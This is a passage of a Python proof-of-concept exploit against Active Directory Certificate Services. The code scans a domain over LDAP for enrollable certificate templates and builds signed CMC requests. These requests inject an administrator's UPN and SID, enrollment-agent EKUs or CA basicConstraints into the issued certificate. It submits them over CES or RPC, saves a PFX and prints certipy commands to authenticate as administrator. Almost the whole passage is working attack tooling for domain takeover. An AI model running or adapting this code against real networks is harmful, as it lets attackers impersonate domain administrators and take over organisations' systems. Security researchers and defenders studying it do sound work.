    m = re.search(r'<BinarySecurityToken[^>]*>(.*?)</BinarySecurityToken>', resp_text, re.DOTALL)
    if m:
        token = m.group(1)
        token = re.sub(r'&#x[0-9A-Fa-f]+;', '', token)
        token = token.replace('\r', '').replace('\n', '').strip()
        return base64.b64decode(token + '=' * (-len(token) % 4))
    return None

def extract_leaf_cert(der_data):
    """Try to load as raw cert, or extract from PKCS7/CMS."""
    try:
        return x509.load_der_x509_certificate(der_data)
    except Exception:
        pass
    # Try stripping outer ContentInfo/SignedData to get cert
    # Quick heuristic: look for a SEQUENCE starting with version
    try:
        from cryptography.hazmat.primitives.serialization import pkcs7 as p7lib
        certs = p7lib.load_der_pkcs7_certificates(der_data)
        if certs:
            # Return the leaf (non-CA) cert
            for c in certs:
                bc = None
                try:
                    bc = c.extensions.get_extension_for_class(x509.BasicConstraints)
                except Exception:
                    pass
                if bc is None or not bc.value.ca:
                    return c
            return certs[0]
    except Exception:
        pass
    return None

# LDAP SID auto-lookup

CT_FLAG_SUBJECT_ALT_REQUIRE_UPN = 0x2000000
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
OID_CLIENT_AUTH = '1.3.6.1.5.5.7.3.2'

def find_vulnerable_templates(dc_ip: str, domain: str, username: str, password: str,
                               ca_name: str = None) -> list:
    """
    Enumerate AD CS templates that are exploitable via CMC id-cmc-addExtensions:
      - Do NOT have CT_FLAG_SUBJECT_ALT_REQUIRE_UPN (0x2000000) - templates with
        this flag have the CA policy module overwrite our injected SAN post-CMC.
      - Have clientAuth EKU (1.3.6.1.5.5.7.3.2) - required for PKINIT.
      - Have msPKI-RA-Signature = 0 - no CA manager approval or RA cert needed.

    If ca_name is given, also cross-checks which templates the CA has published
    so we only return templates actually available for enrollment.

    Returns list of dicts: [{name, nameFlags, ekus, enrolleeSuppliesSubject}, ...]
    sorted with enrolleeSuppliesSubject=True first (less CA policy enforcement).
    """
    base_dn = ','.join(f'DC={p}' for p in domain.split('.'))
    config_dn = f'CN=Configuration,{base_dn}'

    server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL, connect_timeout=10)
    conn = ldap3.Connection(
        server,
        user=f'{domain}\\{username}',
        password=password,
        authentication=ldap3.NTLM,
        auto_bind=True
    )

    # get templates published by the CA (if ca_name provided)
    published = None
    if ca_name:
        conn.search(
            search_base=f'CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_dn}',
            search_filter=f'(cn={ca_name})',
            search_scope=ldap3.SUBTREE,
            attributes=['certificateTemplates']
        )
        if conn.entries:
            published = set(str(v) for v in conn.entries[0]['certificateTemplates'])

    # query all templates
    conn.search(
        search_base=f'CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}',
        search_filter='(objectClass=pKICertificateTemplate)',
        search_scope=ldap3.SUBTREE,
        attributes=['cn', 'msPKI-Certificate-Name-Flag', 'pKIExtendedKeyUsage',
                    'msPKI-RA-Signature', 'msPKI-Enrollment-Flag']
    )

    vulnerable = []
    blocked = []

    for entry in conn.entries:
        name = str(entry['cn'])

        # Skip if CA hasn't published this template
        if published is not None and name not in published:
            continue

        try:
            name_flags = int(str(entry['msPKI-Certificate-Name-Flag']))
        except Exception:
            name_flags = 0

        try:
            ra_sig = int(str(entry['msPKI-RA-Signature']))
        except Exception:
            ra_sig = 0

        ekus = [str(v) for v in entry['pKIExtendedKeyUsage']] if entry['pKIExtendedKeyUsage'] else []

        has_client_auth = OID_CLIENT_AUTH in ekus
        has_require_upn = bool(name_flags & CT_FLAG_SUBJECT_ALT_REQUIRE_UPN)
        enrollee_supplies = bool(name_flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
        needs_ra = ra_sig > 0

        if not has_client_auth:
            continue  # can't PKINIT without clientAuth

        if needs_ra:
            continue  # needs CA manager approval - skip

        if has_require_upn:
            blocked.append(name)
            continue  # CA policy overwrites our injected SAN - blocked

        vulnerable.append({
            'name': name,
            'nameFlags': name_flags,
            'ekus': ekus,
            'enrolleeSuppliesSubject': enrollee_supplies,
        })

    # Prefer templates where enrollee supplies subject (less policy enforcement)
    vulnerable.sort(key=lambda t: (not t['enrolleeSuppliesSubject'], t['name']))

    print(f"[*] Template discovery: {len(vulnerable)} exploitable, {len(blocked)} blocked by REQUIRE_UPN")
    if blocked:
        print(f"    Blocked (CA will overwrite injected SAN): {', '.join(blocked)}")
    if vulnerable:
        print(f"    Exploitable templates:")
        for t in vulnerable:
            flags_note = []
            if t['enrolleeSuppliesSubject']:
                flags_note.append('ENROLLEE_SUPPLIES_SUBJECT')
            note = f"  [{', '.join(flags_note)}]" if flags_note else ''
            print(f"      [+] {t['name']}  nameFlags={hex(t['nameFlags'])}{note}")

    return vulnerable


def ldap_lookup_sid(dc_ip: str, domain: str, username: str, password: str, target_upn: str) -> bytes:
    """
    Query AD for objectSid of the user matching target_upn.
    Returns raw binary SID bytes, or raises RuntimeError on failure.
    domain: e.g. 'example.local'
    """
    base_dn = ','.join(f'DC={part}' for part in domain.split('.'))
    server = ldap3.Server(dc_ip, port=389, get_info=ldap3.ALL, connect_timeout=10)
    conn = ldap3.Connection(
        server,
        user=f'{domain}\\{username}',
        password=password,
        authentication=ldap3.NTLM,
        auto_bind=True
    )
    conn.search(
        search_base=base_dn,
        search_filter=f'(userPrincipalName={target_upn})',
        search_scope=ldap3.SUBTREE,
        attributes=['objectSid', 'sAMAccountName']
    )
    if not conn.entries:
        # Fallback: try sAMAccountName match on the local part
        local = target_upn.split('@')[0]
        conn.search(
            search_base=base_dn,
            search_filter=f'(sAMAccountName={local})',
            search_scope=ldap3.SUBTREE,
            attributes=['objectSid', 'sAMAccountName']
        )
    if not conn.entries:
        raise RuntimeError(f"LDAP: no user found for UPN '{target_upn}'")
    entry = conn.entries[0]
    sam = str(entry['sAMAccountName'])
    from ldap3.protocol.formatters.formatters import format_sid
    raw_sid = entry['objectSid'].raw_values[0]  # binary SID
    sid_str = format_sid(raw_sid)
    print(f"[*] LDAP: found '{sam}' -> SID {sid_str}")
    return raw_sid

# Main

def main():
    ap = argparse.ArgumentParser(
        description="CES CMC id-cmc-addExtensions SAN injection PoC"
    )
    ap.add_argument('--cert', default=None,
                    help="Signer PEM cert (CA-issued). Not needed with --auto-signer.")
    ap.add_argument('--key', default=None,
                    help="Signer PEM private key. Not needed with --auto-signer.")
    ap.add_argument('--auto-signer', action='store_true',
                    help="Auto-enroll a throwaway cert via PKCS#10 RPC and use it as CMC signer. "
                         "Requires --ca-host, --ca-name, --dc-user, --dc-pass. "
                         "No pre-existing cert needed - full attack from domain creds only.")
    ap.add_argument('--ces-url', default=None,
                    help="CES SOAP endpoint (e.g. https://srv03/CANAME_CES_Certificate/service.svc/CES). "
                         "Use this OR --ca-host/--ca-name for RPC mode.")
    ap.add_argument('--template', default=None,
                    help="Certificate template name. If omitted, auto-discovers the best "
                         "exploitable template via LDAP (requires --dc-ip + --dc-pass).")
    ap.add_argument('--inject-upn', default=None,
                    help="UPN to inject in SAN via id-cmc-addExtensions (e.g. administrator@domain.com). "
                         "Omit when using --inject-eku only (EA-cert mode).")
    ap.add_argument('--inject-eku', default=None,
                    help="Comma-separated EKU OIDs to inject via CMC-ADDEXT (e.g. 1.3.6.1.4.1.311.20.2.1). "
                         "Attack Vector 1: inject Certificate Request Agent EKU into a User template cert -> "
                         "EA cert -> ESC3-phase2 with admin identity. "
                         "Can be combined with --inject-upn.")
    ap.add_argument('--inject-app-policies', default=None,
                    help="Comma-separated OIDs to inject as Application Policies (1.3.6.1.4.1.311.21.10) "
                         "via CMC-ADDEXT. Tests whether certca.dll leaves App Policies untouched when the "
                         "template does not define them. E.g. 1.3.6.1.4.1.311.20.2.1 (EA OID). "
                         "If the issued cert retains the injected App Policies, EOBO with this cert "
                         "may bypass the EA-OID check if certsrv.exe reads App Policies not EKU.")
    ap.add_argument('--inject-ca-cert', action='store_true',
                    help="Inject basicConstraints: CA:TRUE pathLen:0 (critical) + keyUsage: keyCertSign+cRLSign+digitalSignature (critical) "
                         "via CMC-ADDEXT. Tests whether certpdef.dll omits basicConstraints removal for non-CA templates "
                         "(FUN_180007c9c only runs when template flag 0x80 is set - not set for User/WebServer/etc). "
                         "If both extensions survive in the issued cert, it can act as an intermediate CA to sign "
                         "an admin cert -> PKINIT chain: admin-cert -> probeuser-CA-cert -> Enterprise CA (NTAuth). "
                         "Combine with --template User and inspect output with: "
                         "openssl pkcs12 -in out.pfx -nodes -passin pass:addext | openssl x509 -text -noout")
    ap.add_argument('--subject-cn', default='CMC Test',
                    help="Subject CN for the inner CSR (not the injected SAN)")
    ap.add_argument('--out', default='cmc_addext_loot.pfx', help="Output PFX")
    ap.add_argument('--pfx-pass', default='addext', help="PFX password")
    ap.add_argument('--dump-cmc', default=None,
                    help="Save raw CMC DER to file (for debugging with openssl/certutil)")
    ap.add_argument('--inject-template', default=None,
                    help="Template name to inject via szOID_CMC_ADD_ATTRIBUTES NVP before policy runs. "
                         "E.g. 'OfflineRouter'. Sets CertificateTemplate property via SetRequestProperty "
                         "BEFORE certca.dll VerifyRequest, potentially switching UPN/DNS stamp logic. "
                         "Can be combined with --inject-upn for template-switch + SAN injection.")
    ap.add_argument('--inject-userdn', default=None,
                    help="UserDN to inject via szOID_CMC_ADD_ATTRIBUTES NVP. "
                         "E.g. 'CN=Administrator,CN=Users,DC=example,DC=local'. "
                         "Tests whether certsrv.exe SetRequestProperty('UserDN') overwrites the "
                         "server-side UserDN used by certpdef.dll for LDAP base-search + UPN stamp. "
                         "If effective, certpdef will LDAP-fetch admin's UPN and stamp it on the cert.")
    ap.add_argument('--inject-sid', default=None,
                    help="Manually specify SID to inject (S-1-5-21-...-500). "
                         "Overrides --dc-ip auto-lookup.")
    ap.add_argument('--dc-ip', default=None,
                    help="DC IP for automatic SID lookup via LDAP (e.g. 10.0.0.10). "
                         "When set, SID is resolved from AD automatically and always injected.")
    ap.add_argument('--dc-user', default='administrator',
                    help="Username for LDAP SID lookup (default: administrator)")
    ap.add_argument('--dc-pass', default=None,
                    help="Password for LDAP SID lookup")
    # RPC mode (MS-ICPR) - alternative to CES
    ap.add_argument('--ca-host', default=None,
                    help="CA hostname/IP for direct RPC submission via MS-ICPR (no CES needed). "
                         "e.g. 10.0.0.20 or ca.example.local")
    ap.add_argument('--ca-name', default=None,
                    help="CA name for RPC mode (e.g. SILENTSTRIKE-SRV03-CA). "
                         "Required with --ca-host.")
    args = ap.parse_args()

    if not args.ces_url and not args.ca_host:
        ap.error("Provide either --ces-url (CES mode) or --ca-host + --ca-name (RPC mode)")
    if args.ca_host and not args.ca_name:
        ap.error("--ca-name is required with --ca-host")
    if args.auto_signer and not args.ca_host:
        ap.error("--auto-signer requires --ca-host and --ca-name")
    if not args.auto_signer and not (args.cert and args.key):
        ap.error("Provide --cert and --key, or use --auto-signer")
    if not args.inject_upn and not args.inject_eku and not args.inject_template and not args.inject_app_policies and not args.inject_ca_cert:
        ap.error("Provide at least one of --inject-upn (SAN injection), --inject-eku (EKU injection), "
                 "--inject-app-policies (Application Policies injection), "
                 "--inject-template (NVP template switch via CMC-ADD-ATTRIBUTES), "
                 "or --inject-ca-cert (basicConstraints CA:TRUE + keyUsage keyCertSign)")

    # Parse --inject-eku OID list
    inject_eku_list = None
    if args.inject_eku:
        inject_eku_list = [oid.strip() for oid in args.inject_eku.split(',')]
        print(f"[*] EKU injection mode - OIDs: {inject_eku_list}")

    # Parse --inject-app-policies OID list
    inject_app_policies_list = None
    if args.inject_app_policies:
        inject_app_policies_list = [oid.strip() for oid in args.inject_app_policies.split(',')]
        print(f"[*] Application Policies injection mode - OIDs: {inject_app_policies_list}")

    # Derive domain string (used for NTLM auth) - prefer inject-upn, fall back to dc-user
    def _domain_from(upn_or_none):
        if upn_or_none and '@' in upn_or_none:
            return upn_or_none.split('@')[-1]
        if args.dc_user and '@' in args.dc_user:
            return args.dc_user.split('@')[-1]
        return ''
    rpc_domain = _domain_from(args.inject_upn)
    # Strip domain suffix from dc_user so impacket NTLM gets bare username
    rpc_username = args.dc_user.split('@')[0] if args.dc_user and '@' in args.dc_user else args.dc_user
    rpc_mode = bool(args.ca_host) and not args.ces_url

    # Template auto-discovery
    if args.template is None:
        if not args.dc_ip or not args.dc_pass:
            ap.error("--template is required unless --dc-ip and --dc-pass are provided for auto-discovery")
        domain_for_ldap = _domain_from(args.inject_upn)
        print(f"[*] No --template specified - scanning AD for exploitable templates ...")
        templates = find_vulnerable_templates(
            dc_ip=args.dc_ip,
            domain=domain_for_ldap,
            username=rpc_username,
            password=args.dc_pass,
            ca_name=args.ca_name,
        )
        if not templates:
            print("[-] No exploitable templates found (all published clientAuth templates have REQUIRE_UPN).")
            print("    Try specifying --template manually or enrolling via a template without CT_FLAG_SUBJECT_ALT_REQUIRE_UPN.")
            sys.exit(1)
        args.template = templates[0]['name']
        print(f"[*] Auto-selected template: {args.template}")

    print("[*] CMC id-cmc-addExtensions SAN Injection PoC")

    # Signer cert: load from file or auto-enroll
    if args.auto_signer:
        if not args.dc_pass:
            print("[-] --auto-signer requires --dc-pass")
            sys.exit(1)
        domain = rpc_domain
        print(f"[*] --auto-signer: enrolling throwaway cert via PKCS#10 RPC ...")
        signer_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        signer_csr_der = build_plain_csr('cmc-autosigner', signer_key)
        # Signer cert only needs to be CA-issued - does NOT need to be the injection
        # target template. Try templates in order; any CA-issued cert works as CMC signer.
        # REQUIRE_UPN/clientAuth restrictions don't matter for the signing role.
        signer_templates = ['User', args.template, 'Machine', 'WebServer', 'EFS', 'EnrollmentAgent']
        signer_cert_der = None
        for signer_tmpl in signer_templates:
            try:
                signer_cert_der = rpc_enroll_pkcs10(
                    ca_host=args.ca_host, ca_name=args.ca_name,
                    domain=domain, username=rpc_username, password=args.dc_pass,
                    csr_der=signer_csr_der, template_name=signer_tmpl
                )
                print(f"[+] Auto-signer enrolled via template: {signer_tmpl}")
                break
            except Exception as e:
                print(f"[~] Signer template '{signer_tmpl}' failed: {str(e)[:60]}")
        if signer_cert_der is None:
            print("[-] Auto-signer enrollment failed: no accessible template found")
            sys.exit(1)
        signer_cert = x509.load_der_x509_certificate(signer_cert_der)
        # extract leaf if PKCS7 chain returned
        if signer_cert is None:
            signer_cert = extract_leaf_cert(signer_cert_der)
        print(f"[+] Auto-signer cert obtained: {signer_cert.subject.rfc4514_string()}")
    else:
        print(f"[*] Loading signer cert: {args.cert}")
        with open(args.cert, 'rb') as f:
            signer_cert = x509.load_pem_x509_certificate(f.read())
        with open(args.key, 'rb') as f:
            signer_key = serialization.load_pem_private_key(f.read(), None)
        print(f"[*] Signer: {signer_cert.subject.rfc4514_string()}")

    # Fresh key for the certificate being requested (separate from signer key)
    print(f"[*] Generating fresh RSA-2048 key for enrollment...")
    new_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    print(f"[*] Building plain CSR (no SAN) with subject CN={args.subject_cn}")
    csr_der = build_plain_csr(args.subject_cn, new_key)

    sid_binary = None
    if args.inject_sid:
        # Manual override takes precedence
        sid_binary = sid_str_to_binary(args.inject_sid)
        print(f"[*] Using manually specified SID: {args.inject_sid}")
        print(f"    Binary ({len(sid_binary)}B): {sid_binary.hex()}")
    elif args.dc_ip:
        # Auto-lookup from AD
        if not args.dc_pass:
            print("[-] --dc-ip requires --dc-pass for LDAP authentication")
            sys.exit(1)
        domain = rpc_domain
        print(f"[*] Auto-resolving SID for '{args.inject_upn}' from {args.dc_ip} ...")
        try:
            sid_binary = ldap_lookup_sid(args.dc_ip, domain, rpc_username, args.dc_pass, args.inject_upn)
            print(f"    Binary ({len(sid_binary)}B): {sid_binary.hex()}")
        except Exception as e:
            print(f"[-] LDAP SID lookup failed: {e}")
            print(f"[!] Continuing without SID extension (use --inject-sid to set manually)")
    else:
        print(f"[~] No SID injection (use --dc-ip for auto-lookup or --inject-sid for manual)")

    if args.inject_upn:
        print(f"[*] Injecting SAN via id-cmc-addExtensions: UPN={args.inject_upn}")
    pki_data = build_pkidata(csr_der, args.inject_upn, sid_binary=sid_binary,
                             inject_eku=inject_eku_list,
                             inject_template=args.inject_template,
                             inject_app_policies=inject_app_policies_list,
                             inject_userdn=args.inject_userdn,
                             inject_ca_cert=args.inject_ca_cert)
    print(f"[*] PKIData size: {len(pki_data)} bytes")

    print(f"[*] Signing CMC with signer cert...")
    cmc_der = build_signed_cmc(pki_data, signer_cert, signer_key)
    print(f"[*] CMC SignedData size: {len(cmc_der)} bytes")

    if args.dump_cmc:
        with open(args.dump_cmc, 'wb') as f:
            f.write(cmc_der)
        print(f"[*] CMC DER saved to {args.dump_cmc}")
        print(f"    Inspect with: openssl asn1parse -in {args.dump_cmc} -inform DER")

    # Submission
    cert_der = None

    if rpc_mode:
        # MS-ICPR direct RPC - no CES required
        if not args.dc_pass:
            print("[-] --dc-pass is required for RPC mode authentication")
            sys.exit(1)
        domain = rpc_domain
        print(f"[*] RPC mode: submitting to \\\\{args.ca_host}\\pipe\\cert  CA={args.ca_name}")
        print(f"[*] Template: {args.template}")
        try:
            cert_der = rpc_submit_cmc(
                ca_host=args.ca_host,
                ca_name=args.ca_name,
                domain=domain,
                username=rpc_username,
                password=args.dc_pass,
                cmc_der=cmc_der,
                template_name=args.template,
            )
        except Exception as e:
            print(f"[-] RPC submission failed: {e}")
            sys.exit(1)
    else:
        # CES SOAP mode (mutual TLS with signer cert)
        cmc_b64 = base64.b64encode(cmc_der).decode()
        soap = build_ces_soap(args.ces_url, cmc_b64, args.template)

        cert_pem_tmp = '/tmp/cmc_addext_client.pem'
        key_pem_tmp  = '/tmp/cmc_addext_client.key'
        with open(cert_pem_tmp, 'wb') as f:
            f.write(signer_cert.public_bytes(serialization.Encoding.PEM))
        with open(key_pem_tmp, 'wb') as f:
            f.write(signer_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()
            ))

        print(f"[*] CES mode: submitting to {args.ces_url}")
        print(f"[*] Template: {args.template}")

        headers = {"Content-Type": "application/soap+xml; charset=utf-8"}
        try:
            resp = requests.post(
                args.ces_url, headers=headers, data=soap,
                cert=(cert_pem_tmp, key_pem_tmp), verify=False, timeout=30
            )
        except Exception as e:
            print(f"[-] HTTP error: {e}")
            sys.exit(1)

        print(f"[*] HTTP {resp.status_code}")
        if resp.status_code != 200:
            fault  = re.search(r'<(?:\w+:)?(?:faultstring|Text)[^>]*>(.*?)</(?:\w+:)?(?:faultstring|Text)>', resp.text, re.DOTALL)
            fault2 = re.search(r'<(?:\w+:)?Detail[^>]*>(.*?)</(?:\w+:)?Detail>', resp.text, re.DOTALL)
            fault3 = re.search(r'HResult>(.*?)</HResult>', resp.text, re.DOTALL)
            fault4 = re.search(r'ErrorCode>(.*?)</ErrorCode>', resp.text, re.DOTALL)
            if fault:  print(f"    SOAP Fault: {fault.group(1)[:500]}")
            if fault2: print(f"    Detail: {fault2.group(1)[:500]}")
            if fault3: print(f"    HResult: {fault3.group(1)[:200]}")
            if fault4: print(f"    ErrorCode: {fault4.group(1)[:200]}")
            if not any([fault, fault2, fault3, fault4]):
                print(resp.text[:2000])
            sys.exit(1)

        cert_der = extract_cert_from_response(resp.text)
        if not cert_der:
            print("[-] No BinarySecurityToken in response.")
            print(resp.text[:600])
            sys.exit(1)

    issued = extract_leaf_cert(cert_der)
    if not issued:
        print(f"[+] Certificate received ({len(cert_der)} bytes) but could not parse.")
        sys.exit(1)

    print(f"[+] Certificate issued!")
    print(f"    Subject:  {issued.subject.rfc4514_string()}")
    print(f"    Serial:   {issued.serial_number:x}")
    print(f"    NotAfter: {issued.not_valid_after_utc}")

    # Check SAN
    try:
        san_ext = issued.extensions.get_extension_for_class(x509.SubjectAlternativeName)
        print(f"    SAN:      {san_ext.value}")
        san_str = str(san_ext.value)
        if args.inject_upn and args.inject_upn.lower() in san_str.lower():
            print(f"\n[!!!] VULNERABILITY CONFIRMED: Injected UPN '{args.inject_upn}' found in SAN!")
            print(f"      Template {args.template} does NOT need ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME")
            print(f"      id-cmc-addExtensions bypasses the extension allowlist in certsrv.exe")
        else:
            print(f"[~] SAN present but injected UPN not found: {san_str}")
    except x509.ExtensionNotFound:
        print(f"    SAN:      [NOT PRESENT - bypass did not inject SAN into issued cert]")
        print(f"[~] SAN not in issued cert. Extensions may be disabled (EXTENSION_DISABLE_FLAG).")
        print(f"    Check pending request in CA database for the set extension.")

    # Check other interesting extensions
    for ext_class in [x509.BasicConstraints, x509.KeyUsage, x509.ExtendedKeyUsage]:
        try:
            ext = issued.extensions.get_extension_for_class(ext_class)
            print(f"    {ext_class.__name__}: {ext.value}")
        except x509.ExtensionNotFound:
            pass

    # EKU injection confirmation
    if inject_eku_list:
        try:
            eku_ext = issued.extensions.get_extension_for_class(x509.ExtendedKeyUsage)
            present_oids = {u.dotted_string for u in eku_ext.value}
            for oid in inject_eku_list:
                if oid in present_oids:
                    print(f"\n[!!!] EKU INJECTION CONFIRMED: OID {oid} present in issued cert EKU!")
                    if oid == OID_CERT_REQ_AGENT:
                        print(f"      -> This cert is an ENROLLMENT AGENT cert!")
                        print(f"      -> Use for ESC3-phase2: certipy req -u testuser@lab.local -p PASSWORD \\")
                        print(f"                 -ca CORP-ROOT-CA -target SRV03 \\")
                        print(f"                 -template User -on-behalf-of 'LAB\\administrator' \\")
                        print(f"                 -pfx {args.out} -pfx-password {args.pfx_pass}")
                else:
                    print(f"[~] EKU OID {oid} NOT found in issued cert - CA blocked injection or merged differently")
        except x509.ExtensionNotFound:
            if inject_eku_list:
                print(f"[~] No EKU extension in issued cert - injection may have been stripped")

    # Save PFX
    pfx = pkcs12.serialize_key_and_certificates(
        name=b'cmc_addext',
        key=new_key,
        cert=issued,
        cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(args.pfx_pass.encode())
    )
    with open(args.out, 'wb') as f:
        f.write(pfx)
    print(f"\n[*] PFX saved to {args.out} (password: {args.pfx_pass})")
    print(f"[*] Verify: python3 verify_cert_sid.py {args.out} {args.pfx_pass}")
    print(f"[*] Auth:   certipy auth -pfx {args.out} -password {args.pfx_pass} -dc-ip <DC_IP> -domain <DOMAIN> -username administrator")

if __name__ == '__main__':
    main()
